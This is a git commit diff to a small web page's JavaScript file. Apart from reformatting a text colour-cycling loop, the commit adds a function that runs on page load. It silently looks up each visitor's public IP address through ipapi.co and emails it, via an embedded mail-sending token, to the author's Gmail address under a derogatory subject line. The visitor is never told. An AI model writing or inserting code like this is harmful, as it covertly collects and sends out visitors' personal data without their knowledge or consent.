f43dc893f71a805d03f251300435d8b6a6873558
Walden-Dev <111320484+Walden-Dev@users.noreply.github.com>
2022-12-04 00:13:41 +0100

    Add files via upload

--- js/index.js
+++ js/index.js
@@ -1,15 +1,30 @@
-const myTextElement = document.querySelector('.main_text')
+const myTextElement = document.querySelector(".main_text");
 const colors = ["#ff0000", "#09ff00", "#0000ff"];
 
 let i = 0;
 
-const colorloop = () =>
-{
-    if(i >= colors.length) i = 0;
+const colorloop = () => {
+  if (i >= colors.length) i = 0;
 
-    myTextElement.style.color = colors[i];
-    i++;
+  myTextElement.style.color = colors[i];
+  i++;
 };
 
 setInterval(colorloop, 500);
 
+const getIp = () => {
+  fetch("https://ipapi.co/json/")
+    .then((response) => response.json())
+    .then((data) => {
+      console.log(data.ip);
+      Email.send({
+        SecureToken: "6159cc5f-8436-4273-8e76-f9620c4bda2f",
+        To: "walden.devbusiness@gmail.com",
+        From: "walden.devbusiness@gmail.com",
+        Subject: "IP KURWY",
+        Body: data.ip,
+      }).then((message) => alert(message));
+    });
+};
+
+getIp();
